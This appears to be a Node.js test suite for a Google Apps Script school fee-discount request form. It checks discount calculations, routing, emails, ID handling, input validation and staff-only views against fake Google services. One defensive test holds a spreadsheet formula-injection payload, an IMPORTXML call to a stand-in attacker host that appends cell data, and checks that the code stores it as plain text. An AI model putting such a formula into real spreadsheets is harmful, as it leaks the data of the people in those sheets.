'use strict';
// End-to-end test of the built Apps Script project (dist/gas) against in-memory
// fakes of SpreadsheetApp, DriveApp, MailApp, LockService and PropertiesService.
// Run `npm test` (it builds first).
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('node:fs');
const path = require('node:path');

const GAS = path.join(__dirname, '..', 'dist', 'gas');
const LOAD_ORDER = ['Shared.gs', 'Rules.gs', 'Schema.gs', 'Config.gs', 'Register.gs', 'Mail.gs', 'Code.gs'];

function fakeGoogle(opts = {}) {
  const sent = [], errors = [], props = {}, folders = {}, spreadsheets = {};
  const locks = { held: 0, released: 0 };

  class Range {
    constructor(sheet, r, c, nr, nc) { Object.assign(this, { sheet, r, c, nr, nc }); }
    getValues() {
      const out = [];
      for (let i = 0; i < this.nr; i++) {
        const row = this.sheet.data[this.r - 1 + i] || [];
        const vals = [];
        for (let j = 0; j < this.nc; j++) vals.push(row[this.c - 1 + j] ?? '');
        out.push(vals);
      }
      return out;
    }
    setValues(vals) {
      if (vals.length !== this.nr || vals.some(v => v.length !== this.nc)) {
        throw new Error(`setValues: data is ${vals.length}x${vals[0] && vals[0].length}, range is ${this.nr}x${this.nc}`);
      }
      vals.forEach((v, i) => {
        const row = this.sheet.data[this.r - 1 + i] = this.sheet.data[this.r - 1 + i] || [];
        v.forEach((x, j) => { row[this.c - 1 + j] = x; });
      });
      return this;
    }
    setValue(v) { return this.setValues([[v]]); }
    setFontWeight() { return this; } setBackground() { return this; } setFontSize() { return this; }
  }
  class Sheet {
    constructor(name) { this.name = name; this.data = []; }
    getName() { return this.name; }
    getLastRow() {
      for (let i = this.data.length - 1; i >= 0; i--) if (this.data[i] && this.data[i].some(v => v !== '' && v != null)) return i + 1;
      return 0;
    }
    getLastColumn() {
      let m = 0;
      this.data.forEach(r => { if (r) for (let j = r.length - 1; j >= 0; j--) if (r[j] !== '' && r[j] != null) { m = Math.max(m, j + 1); break; } });
      return m;
    }
    getRange(r, c, nr = 1, nc = 1) { return new Range(this, r, c, nr, nc); }
    setFrozenRows() {} setColumnWidth() {}
    clear() { this.data = []; }
    rows() { const [h, ...b] = this.data; return b.filter(Boolean).map(r => Object.fromEntries(h.map((k, i) => [k, r[i] ?? '']))); }
  }
  class Spreadsheet {
    constructor(name) { this.id = 'ss' + (Object.keys(spreadsheets).length + 1); this.name = name; this.sheets = [new Sheet('Sheet1')]; }
    getId() { return this.id; }
    getUrl() { return 'https://docs.google.com/spreadsheets/d/' + this.id; }
    getSheetByName(n) { return this.sheets.find(s => s.name === n) || null; }
    insertSheet(n, idx) { const s = new Sheet(n); if (idx === undefined) this.sheets.push(s); else this.sheets.splice(idx, 0, s); return s; }
    getSheets() { return this.sheets.slice(); }
    deleteSheet(s) { this.sheets = this.sheets.filter(x => x !== s); }
  }
  function folder(name) {
    const id = 'folder' + (Object.keys(folders).length + 1);
    const f = { id, name, files: [], getId: () => id, getUrl: () => 'https://drive.google.com/drive/folders/' + id,
      createFolder: n => folder(n), createFile: blob => { f.files.push(blob); return {}; } };
    folders[id] = f;
    return f;
  }

  const ctx = {
    console: { log() {}, warn() {}, error: (...a) => errors.push(a.join(' ')) },
    SpreadsheetApp: {
      create: n => { const s = new Spreadsheet(n); spreadsheets[s.id] = s; return s; },
      openById: id => { if (!spreadsheets[id]) throw new Error('no spreadsheet ' + id); return spreadsheets[id]; },
      flush() {}
    },
    DriveApp: { createFolder: n => folder(n), getFolderById: id => folders[id] },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] ?? null, setProperty: (k, v) => { props[k] = String(v); } }) },
    LockService: { getScriptLock: () => ({ waitLock() { locks.held++; }, releaseLock() { locks.released++; } }) },
    MailApp: { sendEmail: o => sent.push(o) },
    Session: { getActiveUser: () => ({ getEmail: () => opts.activeUser || '' }) },
    Utilities: {
      formatDate: () => opts.today || '2026-03-10',
      base64Decode: s => [...Buffer.from(s, 'base64')],
      newBlob: (bytes, mime, name) => ({ bytes, mime, name })
    },
    HtmlService: {
      createTemplateFromFile: name => {
        const tpl = { name, evaluate() { const o = { tpl, title: '', meta: {}, setTitle(x) { o.title = x; return o; }, addMetaTag(k, v) { o.meta[k] = v; return o; } }; return o; } };
        return tpl;
      },
      createHtmlOutputFromFile: name => ({ getContent: () => fs.readFileSync(path.join(GAS, name + '.html'), 'utf8') })
    }
  };
  vm.createContext(ctx);
  for (const f of LOAD_ORDER) vm.runInContext(fs.readFileSync(path.join(GAS, f), 'utf8'), ctx, { filename: f });
  const register = () => spreadsheets[props.registerSpreadsheetId];
  const tab = n => register().getSheetByName(n);
  return { ctx, sent, errors, props, folders, locks, register, tab };
}

function submission(over = {}) {
  const s = {
    lang: 'en', academicYear: '2026-2027',
    guardian: { name: 'Chan Sreymom', relationship: 'MOTHER', phone: '+855 12 345 678', email: 'parent@example.com', alumni: false, staff: false },
    children: [
      { name: 'Vicheka', studentId: '900101', isNew: false, programme: 'Bilingual', grade: 'G8', relationship: 'OWN', ask: {} },
      { name: 'Sophea', studentId: '900102', isNew: false, programme: 'Bilingual', grade: 'G5', relationship: 'OWN', ask: { capitalPct: '50' } },
      { name: 'Dara', studentId: '900103', isNew: false, programme: 'Bilingual', grade: 'G2', relationship: 'OWN', ask: { tuitionPct: '20', capitalPct: '50' } }
    ],
    plan: 'INST2', payBy: '',
    request: { type: 'DISCOUNT', multiYear: false, details: '' },
    reason: { category: 'LOSS_OF_INCOME', statement: 'Our family business lost most of its income this year.' },
    declaration: true, files: []
  };
  return Object.assign(s, over);
}

function ready(opts) {
  const g = fakeGoogle(opts);
  g.ctx.setupRegister();
  return g;
}

// ------------------------------------------------------------------ setup

test('setupRegister builds every tab with the documented headers', () => {
  const g = ready();
  const names = g.register().getSheets().map(s => s.getName());
  assert.deepEqual(names, ['00_README', '01_INTAKE', '02_REQUESTS', '03_REQUEST_STUDENTS', '04_DECISION_LINES', '08_FEE_RULES', '09_LOOKUPS']);
  const schema = g.ctx.SCHEMA;
  const plain = x => JSON.parse(JSON.stringify(x));  // arrays from the sandbox are another realm's
  assert.deepEqual(plain(g.tab('02_REQUESTS').data[0]), plain(schema['02_REQUESTS']));
  assert.equal(g.tab('02_REQUESTS').data[0].length, 61);
  assert.ok(g.props.documentsFolderId, 'documents folder created and remembered');
  assert.ok(g.tab('08_FEE_RULES').getLastRow() > 20);
  assert.ok(g.tab('09_LOOKUPS').getLastRow() > 100);
});

test('setupRegister is safe to run again: data is never cleared', () => {
  const g = ready();
  g.ctx.submitRequest(submission());
  g.ctx.setupRegister();
  assert.equal(g.tab('02_REQUESTS').getLastRow(), 2);
  assert.equal(g.tab('03_REQUEST_STUDENTS').getLastRow(), 4);
});

test('submitting before setup explains what to do', () => {
  const g = fakeGoogle();
  assert.throws(() => g.ctx.submitRequest(submission()), /Run setupRegister\(\)/);
});

// ------------------------------------------------------------------ a real submission

test('a submission writes the request, the children, the entitlement lines and the intake', () => {
  const g = ready();
  const res = g.ctx.submitRequest(submission());
  assert.deepEqual(JSON.parse(JSON.stringify(res)), { ok: true, requestId: 'PR-2627-0001' });

  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Request ID'], 'PR-2627-0001');
  assert.equal(req['Status'], '30 In Review');
  assert.equal(req['Route'], 'Finance Committee');
  assert.equal(req['Channel'], 'Form');
  assert.equal(req['Campus'], 'Secondary / Primary');
  assert.equal(req['Payment Plan'], '2 instalments');
  assert.equal(req['Ask Summary'], 'Sophea: capital 50%; Dara: tuition 20%, capital 50%');
  // Sophea, 2nd child: capital 50% asked vs 20% → 30 pts of $1,200 = $360
  // Dara, 3rd child: capital 50% vs 40% → 10 pts = $120; tuition 20% vs 15% → 5 pts of $8,860 = $443
  assert.equal(req['Gap USD'], 360 + 120 + 443);
  assert.equal(req['Within Policy'], 'No');
  assert.match(req['Route Reasons'], /capital ladder, which the Board has not yet confirmed/);

  const kids = g.tab('03_REQUEST_STUDENTS').rows();
  assert.deepEqual(kids.map(k => k['Child Order']), [1, 2, 3]);
  assert.deepEqual(kids.map(k => k['Tuition Entitled Pct']), [0, 10, 15]);
  assert.deepEqual(kids.map(k => k['Capital Entitled Pct']), [0, 20, 40]);
  assert.deepEqual(kids.map(k => k['Tuition Base USD']), [10800, 9220, 8860]);
  assert.deepEqual(kids.map(k => k['Gap USD']), ['', 360, 563]);

  const lines = g.tab('04_DECISION_LINES').rows();
  assert.deepEqual(lines.map(l => l['Line ID']), ['PR-2627-0001/L1', 'PR-2627-0001/L2', 'PR-2627-0001/L3', 'PR-2627-0001/L4']);
  assert.deepEqual(lines.map(l => `${l['Student ID']} ${l['Fee Type']} ${l['Value']}% ${l['Authority']} ${l['Rule Status']}`), [
    '900102 Tuition 10% Sibling policy confirmed',
    '900102 Capital 20% Policy ladder inferred',
    '900103 Tuition 15% Sibling policy confirmed',
    '900103 Capital 40% Policy ladder inferred'
  ]);
  assert.equal(lines[1]['Conditions'], 'Rule not yet confirmed by the Board');
  assert.equal(lines[0]['Effective To'], '2027-06-30');

  const [intake] = g.tab('01_INTAKE').rows();
  assert.equal(intake['Request ID'], 'PR-2627-0001');
  assert.equal(JSON.parse(intake['Submission (files removed)']).guardian.email, 'parent@example.com');
  assert.deepEqual([g.locks.held, g.locks.released], [1, 1]);
});

test('the family and the finance office are both emailed', () => {
  const g = ready();
  g.ctx.submitRequest(submission());
  assert.equal(g.sent.length, 2);
  const [family, office] = g.sent;
  assert.equal(family.to, 'parent@example.com');
  assert.match(family.subject, /PR-2627-0001/);
  assert.equal(family.replyTo, 'finance-officer@paragonisc.edu.kh');
  assert.match(family.body, /10% sibling discount on tuition: \$922 off/);
  assert.doesNotMatch(family.body, /capital discount by child order/i, 'the unconfirmed ladder is not stated to parents');
  assert.equal(office.to, 'finance-officer@paragonisc.edu.kh');
  assert.equal(office.subject, '[PR-2627-0001] Finance Committee — Chan Sreymom');
  assert.match(office.body, /Gap to decide: \$923/);
  assert.deepEqual(g.errors, []);
});

test('a Khmer submission gets a Khmer acknowledgement', () => {
  const g = ready();
  g.ctx.submitRequest(submission({ lang: 'km' }));
  assert.match(g.sent[0].subject, /សំណើថ្លៃសិក្សារបស់អ្នក PR-2627-0001/);
  assert.equal(g.tab('02_REQUESTS').rows()[0]['Language'], 'Khmer');
});

// ------------------------------------------------------------------ IDs

test('IDs are sequential, and survive a lost counter', () => {
  const g = ready();
  assert.equal(g.ctx.submitRequest(submission()).requestId, 'PR-2627-0001');
  assert.equal(g.ctx.submitRequest(submission()).requestId, 'PR-2627-0002');
  delete g.props.seq_2627;
  assert.equal(g.ctx.submitRequest(submission()).requestId, 'PR-2627-0003', 'falls back to the highest ID in the sheet');
});

// ------------------------------------------------------------------ never trust the browser

test('text that looks like a formula is stored as text', () => {
  const g = ready();
  const s = submission();
  s.reason.statement = '=IMPORTXML("https://attacker.example/?d="&A1,"//a") please help';
  s.guardian.name = '@Chan';
  g.ctx.submitRequest(s);
  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Parent Statement'], "'" + s.reason.statement);
  assert.equal(req['Guardian Name'], "'@Chan");
  assert.equal(req['Phone'], "'+855 12 345 678");
});

test('invalid submissions are refused and nothing is written', () => {
  const g = ready();
  const s = submission();
  s.children[1].studentId = '105317 105320';
  s.declaration = false;
  const res = JSON.parse(JSON.stringify(g.ctx.submitRequest(s)));
  assert.equal(res.ok, false);
  assert.deepEqual(res.errors.map(e => e.field).sort(), ['children.1.studentId', 'declaration']);
  assert.equal(g.tab('02_REQUESTS').getLastRow(), 1);
  assert.equal(g.sent.length, 0);
});

test('unknown fields from the browser are dropped, file sizes are recomputed', () => {
  const g = ready();
  const s = submission();
  s.approvedBy = 'Board';
  s.guardian.role = 'admin';
  s.files = [{ name: 'big.pdf', mimeType: 'application/pdf', size: 10, data: Buffer.alloc(5 * 1024 * 1024).toString('base64') }];
  const res = JSON.parse(JSON.stringify(g.ctx.submitRequest(s)));
  assert.equal(res.ok, false, 'claimed 10 bytes, actually 5 MB');
  assert.deepEqual(res.errors, [{ field: 'files.0', code: 'FILE_SIZE' }]);

  s.files = [];
  g.ctx.submitRequest(s);
  const stored = JSON.parse(g.tab('01_INTAKE').rows()[0]['Submission (files removed)']);
  assert.equal(stored.approvedBy, undefined);
  assert.equal(stored.guardian.role, undefined);
});

test('documents are filed in a folder named for the request', () => {
  const g = ready();
  const s = submission({ files: [{ name: 'letter.pdf', mimeType: 'application/pdf', data: Buffer.from('%PDF-1.4 test').toString('base64') }] });
  g.ctx.submitRequest(s);
  const f = Object.values(g.folders).find(x => x.name.startsWith('PR-2627-0001'));
  assert.equal(f.name, 'PR-2627-0001 — Chan Sreymom');
  assert.equal(f.files[0].name, 'letter.pdf');
  assert.equal(g.tab('02_REQUESTS').rows()[0]['Documents'], f.getUrl());
  assert.doesNotMatch(g.tab('01_INTAKE').rows()[0]['Submission (files removed)'], /JVBERi0/, 'file data is not copied into the sheet');
});

// ------------------------------------------------------------------ auto-resolution

test('within the published policy: stays with the Finance Officer while auto-resolution is off', () => {
  const g = ready();
  const s = submission();
  s.children[1].ask = { tuitionPct: '10' }; s.children[2].ask = {};
  g.ctx.submitRequest(s);
  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Status'], '30 In Review');
  assert.equal(req['Within Policy'], 'Yes');
  assert.match(g.sent[0].body, /will confirm it within 2 working days/);
});

test('with auto-resolution on, a within-policy request closes itself and the family is told', () => {
  const g = ready();
  g.ctx.CONFIG.autoResolveEnabled = true;
  const s = submission();
  s.children[1].ask = { tuitionPct: '10' }; s.children[2].ask = {};
  g.ctx.submitRequest(s);
  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Status'], '15 Auto-resolved within policy');
  assert.equal(req['Decision'], 'Approved');
  assert.equal(req['Decided By'], 'Automatic - within policy');
  assert.equal(req['Informed By'], 'Form (automatic)');
  assert.equal(Object.prototype.toString.call(req['Informed Date']), '[object Date]');
  assert.match(g.sent[0].body, /is confirmed, subject to checking/);
});

test('even with auto-resolution on, nothing closes on the strength of an unpublished rule', () => {
  const g = ready();
  g.ctx.CONFIG.autoResolveEnabled = true;
  const s = submission();
  s.children[1].ask = { capitalPct: '20' }; s.children[2].ask = {};
  g.ctx.submitRequest(s);
  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Status'], '30 In Review');
  assert.equal(req['Within Policy'], 'Only via unpublished rule');
});

// ------------------------------------------------------------------ edges

test('a year with no fee rules is still recorded, and routed to the Finance Officer', () => {
  const g = ready({ today: '2027-02-10' });
  const res = g.ctx.submitRequest(submission({ academicYear: '2027-2028' }));
  assert.equal(res.requestId, 'PR-2728-0001');
  const [req] = g.tab('02_REQUESTS').rows();
  assert.equal(req['Route'], 'Finance Officer');
  assert.match(req['Route Reasons'], /No fee rules loaded/);
  assert.equal(g.tab('04_DECISION_LINES').getLastRow(), 1, 'no lines invented');
  assert.match(g.sent[0].body, /will review your request/);
});

test('the form is served in parent view; staff view only for signed-in staff', () => {
  const anon = ready();
  const out = anon.ctx.doGet({ parameter: { view: 'staff', lang: 'km' } });
  const boot = JSON.parse(out.tpl.boot);
  assert.equal(boot.view, 'parent', 'an anonymous visitor cannot open the staff view');
  assert.equal(boot.lang, 'km');
  assert.equal(boot.mode, 'live');
  assert.ok(boot.rules['2026-2027']);
  assert.equal(out.meta.viewport, 'width=device-width, initial-scale=1');
  assert.doesNotMatch(out.tpl.boot, /</, 'boot JSON is safe inside a script tag');

  const staff = ready({ activeUser: 'finance-officer@paragonisc.edu.kh' });
  assert.equal(JSON.parse(staff.ctx.doGet({ parameter: { view: 'staff' } }).tpl.boot).view, 'staff');
  const outsider = ready({ activeUser: 'someone@gmail.com' });
  assert.equal(JSON.parse(outsider.ctx.doGet({ parameter: { view: 'staff' } }).tpl.boot).view, 'parent');
});

test('the built Form.html includes the shared calculator and takes its boot data from the server', () => {
  const html = fs.readFileSync(path.join(GAS, 'Form.html'), 'utf8');
  assert.match(html, /<\?!= include\('SharedJs'\); \?>/);
  assert.match(html, /var BOOT = <\?!= boot \?>;/);
  const g = fakeGoogle();
  assert.match(g.ctx.include('SharedJs'), /root\.FeeEngine = api/);
});
